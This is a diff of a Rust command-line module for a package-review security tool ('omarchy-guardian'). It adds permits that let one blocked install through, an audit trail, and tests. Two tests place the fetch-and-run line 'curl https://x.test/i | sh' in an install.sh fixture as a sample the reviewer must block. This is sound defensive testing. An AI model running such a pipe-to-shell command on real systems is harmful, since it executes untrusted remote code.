@@ -8,6 +8,7 @@ use std::path::PathBuf;
 use std::process::{Command, ExitCode};
 
 use crate::ask;
+use crate::audit::{self, Gate};
 use crate::config::Settings;
 use crate::config::model::{AiRequirement, Named, Profile, SourceClass};
 use crate::config::show;
@@ -18,6 +19,7 @@ use crate::error::Error;
 use crate::makepkg_gate;
 use crate::notify;
 use crate::pacman::{self, HookArgs};
+use crate::permit::{self, Content, Standing};
 use crate::report::{Blocked, Decision, Report};
 use crate::review::{self, ReviewContext};
 use crate::sandbox;
@@ -38,6 +40,9 @@ Usage:
   omarchy-guardian config show [--class CLASS] | check | path | acknowledge
                                                     (acknowledge: accept, with sudo, settings weaker than the level)
   omarchy-guardian forget <identity> | --all
+  omarchy-guardian permit [ID | --revoke ID]        (let one blocked install through; lists them without ID)
+  omarchy-guardian log [--since TIME] [-n N] [--json]
+                                                    (what Guardian decided, from the system journal)
   omarchy-guardian setup
   omarchy-guardian protect [--off] [--yes]          (turn every gate on, or the install gates off)
   omarchy-guardian test                             (test the saved reviewer with two samples)
@@ -50,11 +55,11 @@ Usage:
 
 CLASS: aur, theme, plugin, source (default). PROFILE: standard, strict, local-only.
 ID names what is reviewed for the review memory, e.g. aur:yay-bin.
-forget ID drops that source's approved baselines; cached verdicts are kept
-(forget --all clears them too).
-Exit codes: 0 clear or warned, 1 findings, 2 incomplete review, AI unavailable,
-not confirmed, or usage error. guard and sandbox replace these with the
-command's own exit code once it starts.";
+forget ID drops that source's approved baselines and what the AUR gate
+remembers of it; cached verdicts are kept (forget --all clears them too).
+Exit codes: 0 clear, warned or permitted, 1 findings, 2 incomplete review, AI
+unavailable, not confirmed, or usage error. guard and sandbox replace these
+with the command's own exit code once it starts.";
 
 const USAGE_ERROR: u8 = 2;
 
@@ -72,7 +77,7 @@ pub(crate) struct Target {
 impl Target {
     /// What a notification says was blocked: the identities under review
     /// (such as `theme:tokyo`), else the reviewed directory's name.
-    fn subject(&self) -> String {
+    pub(crate) fn subject(&self) -> String {
         let identities: Vec<&str> = self
             .units
             .iter()
@@ -116,6 +121,14 @@ enum Invocation {
     },
     /// Run as root by `sweep allow` and `sweep forget` through sudo.
     SweepAllowSystem(Vec<String>),
+    /// `permit [ID | --revoke ID]`.
+    Permit(permit::Command),
+    /// Run as root by `permit` through sudo.
+    PermitSystem(Vec<String>),
+    /// Run as root by the pacman hook script once the review has ended.
+    HookResult(Vec<String>),
+    /// `log [--since TIME] [-n N] [--json]`.
+    Log(audit::log::Options),
     /// `ask <report-id | omarchy-guardian://ask/<id>>`, opened from a report.
     Ask(String),
     /// `status [--waybar | --dismiss | --open-report]`.
@@ -190,6 +203,14 @@ pub fn run(args: impl Iterator<Item = OsString>) -> ExitCode {
         }
     };
 
+    // Root's halves are given everything they act on as arguments: they
+    // run before any settings file of the user's is read.
+    let invocation = match invocation {
+        Invocation::PermitSystem(arguments) => return permit::system_command(&arguments),
+        Invocation::HookResult(arguments) => return permit::hook_result_command(&arguments),
+        other => other,
+    };
+
     let settings = Settings::load();
     for warning in settings.warnings() {
         errln!("omarchy-guardian: {warning}");
@@ -217,20 +238,17 @@ pub fn run(args: impl Iterator<Item = OsString>) -> ExitCode {
             &settings,
             &mut TtyConfirm,
         ),
-        Invocation::PacmanHook(hook) => pacman_hook_command(&hook, &settings),
+        Invocation::PacmanHook(hook) => pacman_hook_command(
+            &hook,
+            &settings,
+            std::env::var_os(permit::ROOT_HOOK).is_some(),
+        ),
+        Invocation::Permit(command) => permit::command(&command, &settings),
+        Invocation::PermitSystem(arguments) => permit::system_command(&arguments),
+        Invocation::HookResult(arguments) => permit::hook_result_command(&arguments),
+        Invocation::Log(options) => audit::log::command(&options),
         Invocation::MakepkgGate(command) => makepkg_gate::run(&command, &settings),
-        Invocation::HookPreflight => {
-            match pacman::preflight(&settings, pacman::system_reviewer_ready(&settings)) {
-                Ok(()) => {
-                    outln!("The pacman gate can review transactions with these settings.");
-                    ExitCode::SUCCESS
-                }
-                Err(reason) => {
-                    errln!("omarchy-guardian: {reason}");
-                    ExitCode::from(2)
-                }
-            }
-        }
+        Invocation::HookPreflight => preflight_command(&settings),
         Invocation::Config(command) => config_command(&command, &settings),
         Invocation::Forget(forget) => forget_command(&forget, Store::default_root()),
         Invocation::Setup => match setup::run(&mut setup::TtyTerminal, &setup::RealEnvironment) {
@@ -240,20 +258,7 @@ pub fn run(args: impl Iterator<Item = OsString>) -> ExitCode {
                 ExitCode::from(2)
             }
         },
-        Invocation::Protect { yes, off } => match if off {
-            tui::unprotect(yes, &mut TtyConfirm)
-        } else {
-            tui::protect(yes, &mut TtyConfirm)
-        } {
-            Ok(message) => {
-                outln!("{message}");
-                ExitCode::SUCCESS
-            }
-            Err(message) => {
-                errln!("omarchy-guardian protect: {message}");
-                ExitCode::from(2)
-            }
-        },
+        Invocation::Protect { yes, off } => protect_command(yes, off),
         Invocation::Test => {
             outln!("Testing the reviewer with a malicious and a harmless sample...");
             let (report, passed) = tui::test();
@@ -279,6 +284,41 @@ pub fn run(args: impl Iterator<Item = OsString>) -> ExitCode {
                 ExitCode::from(2)
             }
         },
+    }
+}
+
+/// `pacman-hook --preflight`: whether the pacman gate could review.
+fn preflight_command(settings: &Settings) -> ExitCode {
+    match pacman::preflight(settings, pacman::system_reviewer_ready(settings)) {
+        Ok(()) => {
+            outln!("The pacman gate can review transactions with these settings.");
+            ExitCode::SUCCESS
+        }
+        Err(reason) => {
+            errln!("omarchy-guardian: {reason}");
+            ExitCode::from(2)
+        }
+    }
+}
+
+/// `protect [--off]`: every gate on, or the install gates off; what came of
+/// it goes into the audit trail.
+fn protect_command(yes: bool, off: bool) -> ExitCode {
+    let outcome = if off {
+        tui::unprotect(yes, &mut TtyConfirm)
+    } else {
+        tui::protect(yes, &mut TtyConfirm)
+    };
+    match outcome {
+        Ok(message) => {
+            audit::gate_changed(if off { "protect --off" } else { "protect" }, "", &message);
+            outln!("{message}");
+            ExitCode::SUCCESS
+        }
+        Err(message) => {
+            errln!("omarchy-guardian protect: {message}");
+            ExitCode::from(2)
+        }
     }
 }
 
@@ -311,16 +351,63 @@ fn with_state_root(mut target: Target) -> Target {
     target
 }
 
-/// Reviews a target, applies confirmation, then prints the report once with
-/// the final decision — never a stale pre-confirmation headline.
+/// A review, its decision, and how a blocked one stands with permits.
+pub(crate) struct Verdict {
+    pub(crate) report: Report,
+    pub(crate) decision: Decision,
+    pub(crate) standing: Standing,
+}
+
+impl Verdict {
+    /// Whether the gate may go on: the review allows it, or a permit of
+    /// the user's overrules the review for exactly this content.
+    pub(crate) fn allows_running(&self) -> bool {
+        self.decision.allows_running() || self.standing.permitted().is_some()
+    }
+}
+
+/// What a gate's review is of, as permits and the audit trail name it
+/// (see `permit::standing`); nothing when it has no digest.
+pub(crate) type ContentOf<'a> = &'a dyn Fn(&Report) -> Vec<Content>;
+
+/// The reviewed tree by its manifest digest, for a gate that reviews one.
+fn tree_content(gate: Gate, target: &Target, report: &Report) -> Vec<Content> {
+    if report.snapshot.files().is_empty() {
+        return Vec::new();
+    }
+    Content::tree(
+        gate,
+        target.class,
+        &target.subject(),
+        &report.snapshot.manifest_digest().to_string(),
+    )
+    .into_iter()
+    .collect()
+}
+
+/// The exit code of a gate that did not start its command: never 0, which
+/// a caller reads as "the command ran".
+const fn not_started_status(decision: Decision) -> u8 {
+    match decision {
+        Decision::Blocked(_) => decision.exit_status(),
+        Decision::Clear | Decision::Warned | Decision::Limited => 2,
+    }
+}
+
+/// Reviews a target, applies confirmation and the user's permits, then
+/// prints the report once with the final decision — never a stale
+/// pre-confirmation headline — and records it in the audit trail. A plain
+/// scan has no `content`: nothing runs after it, so nothing is permitted.
 pub(crate) fn review_and_decide(
     target: &Target,
     settings: &Settings,
     opencode: &OpenCode,
     confirm: Option<&mut dyn Confirm>,
     context: &[String],
-) -> (Report, Decision) {
-    let report = review::review_tree(
+    gate: Gate,
+    content: Option<ContentOf<'_>>,
+) -> Verdict {
+    let mut report = review::review_tree(
         &target.config,
         &ReviewContext {
             settings,
@@ -354,15 +441,78 @@ pub(crate) fn review_and_decide(
         }
     }
 
+    let contents = content.map_or_else(Vec::new, |content| content(&report));
+    let content = contents.first();
+    let standing = permit::standing(
+        &contents,
+        &report,
+        decision,
+        settings,
+        target.state_root.as_deref(),
+    );
+    report.permit = standing.permitted().map(str::to_string);
     report.print(target.show_hashes, decision);
-    (report, decision)
+
+    let verdict = Verdict {
+        report,
+        decision,
+        standing,
+    };
+    let exit = if gate == Gate::Scan {
+        decision.exit_status()
+    } else if verdict.allows_running() {
+        0
+    } else {
+        not_started_status(decision)
+    };
+    let manifest = if verdict.report.snapshot.files().is_empty() {
+        String::new()
+    } else {
+        format!("tree:{}", verdict.report.snapshot.manifest_digest())
+    };
+    audit::review(
+        &audit::Reviewed {
+            gate,
+            class: content.map_or(target.class.name(), Content::class),
+            subject: &target.subject(),
+            digest: &content.map_or(manifest, Content::digest),
+            decision,
+            permit: verdict.standing.permitted(),
+            offered: verdict.standing.offered(),
+            exit,
+        },
+        &verdict.report,
+    )
+    .record();
+    verdict
 }
 
 fn scan_command(target: &Target, settings: &Settings) -> ExitCode {
     let settings = settings_for(target, settings);
-    review_and_decide(target, &settings, &OpenCode::UserPath, None, &[])
-        .1
-        .exit_code()
+    review_and_decide(
+        target,
+        &settings,
+        &OpenCode::UserPath,
+        None,
+        &[],
+        Gate::Scan,
+        None,
+    )
+    .decision
+    .exit_code()
+}
+
+/// What a gate says when it goes on: the review's own word, or the permit
+/// that overruled it.
+pub(crate) fn passed(verdict: &Verdict) -> String {
+    match verdict.standing.permitted() {
+        Some(permit) => format!(
+            "your permit {permit} overrules {}",
+            verdict.report.decision_name(verdict.decision)
+        ),
+        None if verdict.decision == Decision::Warned => "review passed with warnings".into(),
+        None => "review clear".into(),
+    }
 }
 
 /// Reviews the target and hands `command` to `launch` only after a clear or
@@ -377,15 +527,27 @@ fn guard_command(
     launch: &mut dyn FnMut(&[OsString]) -> ExitCode,
 ) -> ExitCode {
     let settings = settings_for(target, settings);
-    let (report, decision) = review_and_decide(target, &settings, opencode, Some(confirm), &[]);
+    let gate = Gate::of_guard(target.class);
+    let verdict = review_and_decide(
+        target,
+        &settings,
+        opencode,
+        Some(confirm),
+        &[],
+        gate,
+        Some(&|report| tree_content(gate, target, report)),
+    );
+    let decision = verdict.decision;
 
-    if !decision.allows_running() {
+    if !verdict.allows_running() {
         match decision {
             Decision::Blocked(Blocked::NotConfirmed) => {
                 errln!("Guardian did not start the command: not confirmed.");
+                verdict.standing.say();
             }
             Decision::Blocked(blocked) => {
                 errln!("Guardian blocked the command because the review did not allow it.");
+                verdict.standing.say();
                 notify::blocked(
                     &target.subject(),
                     notify::reason(blocked),
@@ -396,19 +558,16 @@ fn guard_command(
         }
         return not_started(decision);
     }
-    if let Err(error) = scan::verify_unchanged(&target.config, &report.snapshot) {
+    if let Err(error) = scan::verify_unchanged(&target.config, &verdict.report.snapshot) {
         errln!("Guardian blocked the command because {error}.");
+        audit::refused(gate, &format!("{}: {error}", target.subject()), 2);
         notify::blocked(&target.subject(), &format!("{error}"), notify::Ran::Nothing);
         return ExitCode::from(2);
     }
 
     errln!(
-        "Guardian: review {}; starting {}",
-        if decision == Decision::Warned {
-            "passed with warnings"
-        } else {
-            "clear"
-        },
+        "Guardian: {}; starting {}",
+        passed(&verdict),
         command.first().map_or_else(String::new, |program| program
             .to_string_lossy()
             .into_owned())
@@ -416,13 +575,9 @@ fn guard_command(
     launch(command)
 }
 
-/// The exit code of a `guard` or `sandbox` that did not start its command:
-/// never 0, which a caller reads as "the command ran".
+/// The exit code of a `guard` or `sandbox` that did not start its command.
 fn not_started(decision: Decision) -> ExitCode {
-    match decision {
-        Decision::Blocked(_) => decision.exit_code(),
-        Decision::Clear | Decision::Warned | Decision::Limited => ExitCode::from(2),
-    }
+    ExitCode::from(not_started_status(decision))
 }
 
 /// Replaces this process with the guarded command, so its exit status and
@@ -449,21 +604,37 @@ fn sandbox_command(
     confirm: &mut dyn Confirm,
 ) -> ExitCode {
     let settings = settings_for(target, settings);
-    let (report, decision) =
-        review_and_decide(target, &settings, &OpenCode::UserPath, Some(confirm), &[]);
+    let verdict = review_and_decide(
+        target,
+        &settings,
+        &OpenCode::UserPath,
+        Some(confirm),
+        &[],
+        Gate::Sandbox,
+        Some(&|report| tree_content(Gate::Sandbox, target, report)),
+    );
+    let decision = verdict.decision;
 
-    if !decision.allows_running() {
+    if !verdict.allows_running() {
         if decision == Decision::Blocked(Blocked::NotConfirmed) {
             errln!("Guardian did not start the sandbox command: not confirmed.");
         } else {
             errln!("Guardian did not run the sandbox command because the review did not allow it.");
         }
+        verdict.standing.say();
         return not_started(decision);
     }
-    match sandbox::run(&target.config, &report.snapshot, command) {
+    if let Some(permit) = verdict.standing.permitted() {
+        errln!(
+            "Guardian: your permit {permit} overrules {}; starting the sandbox command.",
+            verdict.report.decision_name(decision)
+        );
+    }
+    match sandbox::run(&target.config, &verdict.report.snapshot, command) {
         Ok(code) => code,
         Err(error) => {
             errln!("Guardian blocked the sandbox run because {error}.");
+            audit::refused(Gate::Sandbox, &format!("{}: {error}", target.subject()), 2);
             ExitCode::from(2)
         }
     }
@@ -492,7 +663,10 @@ fn status_command(mode: StatusMode) -> ExitCode {
     }
 }
 
-fn pacman_hook_command(hook: &HookArgs, settings: &Settings) -> ExitCode {
+/// The pacman gate. `root_hook` says the hook script's root half started
+/// this review and takes a used permit away: it is told by the exit code
+/// (see `permit::PERMITTED_EXIT`), which the script turns into 0.
+fn pacman_hook_command(hook: &HookArgs, settings: &Settings, root_hook: bool) -> ExitCode {
     // A reviewer from PATH is for the end-to-end tests, whose pacman is a
     // script of the user's. In front of a real transaction (pacman runs as
     // root) it is refused, however it came to be asked for.
@@ -502,23 +676,64 @@ fn pacman_hook_command(hook: &HookArgs, settings: &Settings) -> ExitCode {
         errln!(
             "Guardian blocked the pacman transaction: --opencode-from-path is for tests and is refused for a pacman run by root."
         );
+        audit::refused(Gate::Pacman, "a reviewer from PATH was asked for", 2);
         return ExitCode::from(2);
     }
     match pacman::review_transaction(hook, settings) {
-        Ok(report) => {
+        Ok(mut report) => {
             let decision = report.decide(&|class| settings.policy(class));
+            let contents: Vec<Content> = pacman::reviewed_content(&report).into_iter().collect();
+            let standing = permit::standing(
+                &contents,
+                &report,
+                decision,
+                settings,
+                Store::default_root().as_deref(),
+            );
+            report.permit = standing.permitted().map(str::to_string);
             report.print(false, decision);
-            if let Decision::Blocked(blocked) = decision {
+            let exit = match (standing.permitted(), root_hook) {
+                (Some(_), true) => permit::PERMITTED_EXIT,
+                (Some(_), false) => 0,
+                (None, _) => decision.exit_status(),
+            };
+            audit::review(
+                &audit::Reviewed {
+                    gate: Gate::Pacman,
+                    class: &pacman::reviewed_classes(&report),
+                    subject: &pacman::reviewed_names(&report),
+                    digest: &pacman::reviewed_digests(&report),
+                    decision,
+                    permit: standing.permitted(),
+                    offered: standing.offered(),
+                    // What pacman is told: a permitted transaction goes on.
+                    exit: if standing.permitted().is_some() {
+                        0
+                    } else {
+                        exit
+                    },
+                },
+                &report,
+            )
+            .record();
+            if let Some(permit) = standing.permitted() {
+                errln!(
+                    "Guardian: your permit {permit} overrules {}; the transaction goes on.",
+                    report.decision_name(decision)
+                );
+            } else if let Decision::Blocked(blocked) = decision {
+                standing.say();
                 notify::blocked(
                     "a pacman transaction",
                     notify::reason(blocked),
                     notify::Ran::Nothing,
                 );
             }
-            decision.exit_code()
+            ExitCode::from(exit)
         }
         Err(error) => {
             errln!("Guardian blocked the pacman transaction: {error}");
+            audit::refused(Gate::Pacman, &error.to_string(), 2);
             notify::blocked(
                 "a pacman transaction",
                 &error.to_string(),
@@ -571,6 +786,10 @@ fn acknowledge_command(settings: &Settings, confirm: &mut dyn Confirm) -> Result
         return Err("nothing was changed".into());
     }
     setup::install_accepted(&text)?;
+    audit::settings_changed(&format!(
+        "weaker settings acknowledged: {}",
+        weaker::to_acknowledge(settings).join(", ")
+    ));
     tui::status::chosen();
     Ok("Acknowledged; the bar no longer counts them as a problem.".into())
 }
@@ -668,7 +887,8 @@ fn parse_forget(args: &[OsString]) -> Result<Forget, String> {
 
 /// Drops approved baselines (and with `--all`, every cached verdict; one
 /// identity's cached verdicts are kept, since verdicts are not keyed by
-/// identity).
+/// identity), and what the AUR gate remembers: the builds it was told to
+/// go on with, their binaries and what it extracted.
 fn forget_command(forget: &Forget, root: Option<PathBuf>) -> ExitCode {
     let Some(root) = root else {
         errln!("omarchy-guardian: no state directory (set HOME or XDG_STATE_HOME)");
@@ -678,7 +898,7 @@ fn forget_command(forget: &Forget, root: Option<PathBuf>) -> ExitCode {
         outln!("Nothing to forget: {} does not exist.", root.display());
         return ExitCode::SUCCESS;
     }
-    let store = match Store::open(root) {
+    let store = match Store::open(root.clone()) {
         Ok(store) => store,
         Err(reason) => {
             errln!("omarchy-guardian: {reason}");
@@ -688,6 +908,22 @@ fn forget_command(forget: &Forget, root: Option<PathBuf>) -> ExitCode {
     match forget_in(forget, &store) {
         Ok(message) => {
             outln!("{message}");
+            let (gate, what) = match forget {
+                Forget::All => (makepkg_gate::forget_all(&root), "everything".to_string()),
+                Forget::One(identity) => (
+                    makepkg_gate::forget(&root, identity.as_str()),
+                    identity.as_str().to_string(),
+                ),
+            };
+            match gate {
+                Ok(0) => {}
+                Ok(count) => outln!("Forgot {count} record(s) of the AUR gate."),
+                Err(reason) => {
+                    errln!("omarchy-guardian: {reason}");
+                    return ExitCode::from(2);
+                }
+            }
+            audit::forgot(&what);
             ExitCode::SUCCESS
         }
         Err(error) => {
@@ -755,6 +991,15 @@ fn parse(args: &[OsString]) -> Result<Invocation, String> {
         Some("makepkg-gate") => makepkg_gate::parse(rest).map(Invocation::MakepkgGate),
         Some("config") => parse_config(rest).map(Invocation::Config),
         Some("forget") => parse_forget(rest).map(Invocation::Forget),
+        Some("permit") => permit::parse(rest).map(Invocation::Permit),
+        Some("log") => audit::log::parse(rest).map(Invocation::Log),
+        // Run as root by `permit` and by the pacman hook script; not listed.
+        Some("permit-system") => {
+            utf8_arguments("permit-system", rest).map(Invocation::PermitSystem)
+        }
+        Some("pacman-hook-result") => {
+            utf8_arguments("pacman-hook-result", rest).map(Invocation::HookResult)
+        }
         Some("setup") if rest.is_empty() => Ok(Invocation::Setup),
         Some("protect") => {
             let mut yes = false;
@@ -777,16 +1022,9 @@ fn parse(args: &[OsString]) -> Result<Invocation, String> {
             _ => Err("usage: omarchy-guardian sweep-collect [--out]".into()),
         },
         // Run as root by `sweep allow` and `sweep forget`; not listed.
-        Some("sweep-allow-system") => rest
-            .iter()
-            .map(|argument| {
-                argument
-                    .to_str()
-                    .map(str::to_string)
-                    .ok_or_else(|| "sweep-allow-system: arguments must be UTF-8".to_string())
-            })
-            .collect::<Result<Vec<_>, _>>()
-            .map(Invocation::SweepAllowSystem),
+        Some("sweep-allow-system") => {
+            utf8_arguments("sweep-allow-system", rest).map(Invocation::SweepAllowSystem)
+        }
         Some("status") => match rest {
             [] => Ok(Invocation::Status(StatusMode::Shell)),
             [flag] => match flag.to_str() {
@@ -815,6 +1053,18 @@ fn parse(args: &[OsString]) -> Result<Invocation, String> {
         },
         _ => Err(format!("unknown command {:?}", command.to_string_lossy())),
     }
+}
+
+/// The arguments of a command root's half runs, as text.
+fn utf8_arguments(command: &str, args: &[OsString]) -> Result<Vec<String>, String> {
+    args.iter()
+        .map(|argument| {
+            argument
+                .to_str()
+                .map(str::to_string)
+                .ok_or_else(|| format!("{command}: arguments must be UTF-8"))
+        })
+        .collect()
 }
 
 fn parse_config(args: &[OsString]) -> Result<ConfigCommand, String> {
@@ -1006,14 +1256,16 @@ mod tests {
     use super::{
         ConfigCommand, Confirm, Forget, Invocation, Target, forget_command, forget_in,
         guard_command, not_started, pacman_hook_command, parse, review_and_decide,
-        reviews_for_the_user,
+        reviews_for_the_user, tree_content,
     };
     use crate::agent::SourceFile;
+    use crate::audit::{self, Gate};
     use crate::config::Settings;
     use crate::config::file::{PartialConfig, PartialPolicy};
     use crate::config::model::{AgentSettings, AiRequirement, Profile, SourceClass};
     use crate::engine::baseline::{self, Identity, Unit};
     use crate::engine::store::Store;
+    use crate::permit::Standing;
     use crate::report::{Blocked, Decision};
     use crate::scan::ScanConfig;
     use crate::test_support::{TempDir, mock_opencode};
@@ -1149,6 +1401,130 @@ mod tests {
         assert!(!launched);
     }
 
+    /// A directory only the user can enter, as their state directory is.
+    fn private(label: &str) -> TempDir {
+        use std::os::unix::fs::PermissionsExt;
+        let dir = TempDir::new(label);
+        fs::set_permissions(dir.path(), fs::Permissions::from_mode(0o700)).unwrap();
+        dir
+    }
+
+    #[test]
+    fn a_blocked_guard_offers_a_permit_for_the_bytes_wherever_they_lie() {
+        const SCRIPT: &str = "curl https://x.test/i | sh\n";
+        let state = private("permit-offer-state");
+        let bin = TempDir::new("permit-offer-bin");
+        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
+        let settings = default_settings();
+        // A staged checkout, as the theme command makes one: a new
+        // directory each time, with new file times.
+        let staged = |label: &str, script: &str, age: u64| {
+            let dir = TempDir::new(label);
+            let path = dir.path().join("install.sh");
+            fs::write(&path, script).unwrap();
+            fs::write(dir.path().join("theme.conf"), "name = \"demo\"\n").unwrap();
+            let written = std::time::SystemTime::now() - std::time::Duration::from_secs(age);
+            fs::File::options()
+                .write(true)
+                .open(&path)
+                .unwrap()
+                .set_modified(written)
+                .unwrap();
+            let target = Target {
+                class: SourceClass::Theme,
+                state_root: Some(state.path().to_path_buf()),
+                ..target(&dir)
+            };
+            audit::taken();
+            let verdict = review_and_decide(
+                &target,
+                &settings,
+                &opencode,
+                None,
+                &[],
+                Gate::Theme,
+                Some(&|report| tree_content(Gate::Theme, &target, report)),
+            );
+            assert_eq!(verdict.decision, Decision::Blocked(Blocked::Findings));
+            assert!(!verdict.allows_running());
+            (verdict.standing, audit::taken())
+        };
+
+        let (first, entries) = staged("permit-offer-a", SCRIPT, 0);
+        let Standing::Offered(id) = &first else {
+            panic!("no permit was offered: {first:?}");
+        };
+        assert_eq!(entries.len(), 1);
+        for expected in [
+            format!("GUARDIAN_OFFERED={id}"),
+            "GUARDIAN_GATE=theme".to_string(),
+            "GUARDIAN_CLASS=theme".to_string(),
+            "GUARDIAN_EXIT=1".to_string(),
+            "GUARDIAN_DIGEST=tree:".to_string(),
+        ] {
+            assert!(entries[0].contains(&expected), "{expected}\n{}", entries[0]);
+        }
+        assert!(!entries[0].contains("x.test"), "{}", entries[0]);
+
+        // The same commit cloned again elsewhere is the same content.
+        let (second, _) = staged("permit-offer-b", SCRIPT, 86_400);
+        assert_eq!(first, second);
+        // One byte more is not.
+        let (third, _) = staged("permit-offer-c", &format!("{SCRIPT}#\n"), 0);
+        assert!(matches!(&third, Standing::Offered(other) if other != id));
+    }
+
+    #[test]
+    fn a_scan_is_recorded_and_has_nothing_to_permit() {
+        let dir = TempDir::new("scan-audit");
+        let bin = TempDir::new("scan-audit-bin");
+        fs::write(
+            dir.path().join("install.sh"),
+            "curl https://x.test/i | sh\n",
+        )
+        .unwrap();
+        let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
+        audit::taken();
+        let verdict = review_and_decide(
+            &target(&dir),
+            &default_settings(),
+            &opencode,
+            None,
+            &[],
+            Gate::Scan,
+            None,
+        );
+        assert_eq!(verdict.standing, Standing::None);
+        let entries = audit::taken();
+        assert_eq!(entries.len(), 1);
+        assert!(entries[0].contains("GUARDIAN_GATE=scan"), "{}", entries[0]);
+        assert!(entries[0].contains("GUARDIAN_EXIT=1"), "{}", entries[0]);
+        assert!(!entries[0].contains("GUARDIAN_OFFERED"), "{}", entries[0]);
+    }
+
+    #[test]
+    fn hidden_commands_of_the_root_halves_parse() {
+        assert_eq!(
+            parse(&args(&["permit-system", "--revoke", "0123456789abcdef"])).unwrap(),
+            Invocation::PermitSystem(vec!["--revoke".into(), "0123456789abcdef".into()])
+        );
+        assert_eq!(
+            parse(&args(&["pacman-hook-result", "1000", "10"])).unwrap(),
+            Invocation::HookResult(vec!["1000".into(), "10".into()])
+        );
+        assert!(matches!(
+            parse(&args(&["permit"])),
+            Ok(Invocation::Permit(crate::permit::Command::List))
+        ));
+        assert!(parse(&args(&["permit", "--yes", "0123456789abcdef"])).is_err());
+        assert!(matches!(
+            parse(&args(&["log", "-n", "5"])),
+            Ok(Invocation::Log(_))
+        ));
+        // Neither reviews with the user's settings.
+        assert!(!reviews_for_the_user(&parse(&args(&["permit"])).unwrap()));
+    }
+
     #[test]
     fn guard_starts_the_command_after_a_clear_review() {
         let dir = TempDir::new("guard-good");
@@ -1249,7 +1625,7 @@ mod tests {
                 opencode: OpenCode::UserPath,
             };
             assert_eq!(
-                pacman_hook_command(&hook, &default_settings()),
+                pacman_hook_command(&hook, &default_settings(), false),
                 ExitCode::from(2)
             );
         }
@@ -1341,8 +1717,16 @@ mod tests {
         let settings = local_only();
 
         let mut declined = Scripted(Some(false), Vec::new());
-        let (_, decision) =
-            review_and_decide(&target, &settings, &unavailable(), Some(&mut declined), &[]);
+        let decision = review_and_decide(
+            &target,
+            &settings,
+            &unavailable(),
+            Some(&mut declined),
+            &[],
+            Gate::Theme,
+            None,
+        )
+        .decision;
         assert_eq!(decision, Decision::Blocked(Blocked::NotConfirmed));
 
         let mut declined = Scripted(Some(false), Vec::new());
@@ -1387,8 +1771,16 @@ mod tests {
 
         let opencode = OpenCode::At(mock_opencode(bin.path(), "clear", true));
         let mut confirm = Scripted(Some(true), Vec::new());
-        let (_, decision) =
-            review_and_decide(&target, &settings, &opencode, Some(&mut confirm), &[]);
+        let decision = review_and_decide(
+            &target,
+            &settings,
+            &opencode,
+            Some(&mut confirm),
+            &[],
+            Gate::Theme,
+            None,
+        )
+        .decision;
 
         assert_eq!(decision, Decision::Clear);
         assert!(confirm.1.is_empty());
@@ -1551,11 +1943,41 @@ mod tests {
             ExitCode::SUCCESS
         );
         assert!(
-            baseline::load(&store, SourceClass::Aur, &[unit], &AgentSettings::default())
-                .unwrap()
-                .is_none()
+            baseline::load(
+                &store,
+                SourceClass::Aur,
+                std::slice::from_ref(&unit),
+                &AgentSettings::default()
+            )
+            .unwrap()
+            .is_none()
         );
-        assert_eq!(forget_command(&Forget::All, Some(root)), ExitCode::SUCCESS);
+        // What the AUR gate remembers of the package goes with it.
+        let confirmed = |key: &str| crate::makepkg_gate::forget(&root, key).unwrap();
+        fs::create_dir_all(root.join("aur-gate")).unwrap();
+        let record = |key: &str| {
+            root.join("aur-gate").join(format!(
+                "{}.confirmed",
+                crate::sha256::Sha256::digest(key.as_bytes())
+            ))
+        };
+        fs::write(record("demo"), "sources abc\n").unwrap();
+        fs::write(record("other"), "sources abc\n").unwrap();
+        audit::taken();
+        assert_eq!(
+            forget_command(&Forget::One(unit.identity.clone()), Some(root.clone())),
+            ExitCode::SUCCESS
+        );
+        assert!(!record("demo").exists());
+        assert!(record("other").exists());
+        assert!(audit::taken()[0].contains("GUARDIAN_SUBJECT=aur:demo"));
+        assert_eq!(confirmed("aur-src:other"), 1);
+        fs::write(record("other"), "sources abc\n").unwrap();
+        assert_eq!(
+            forget_command(&Forget::All, Some(root.clone())),
+            ExitCode::SUCCESS
+        );
+        assert!(!record("other").exists());
         assert_eq!(forget_command(&Forget::All, None), ExitCode::from(2));
     }
 }
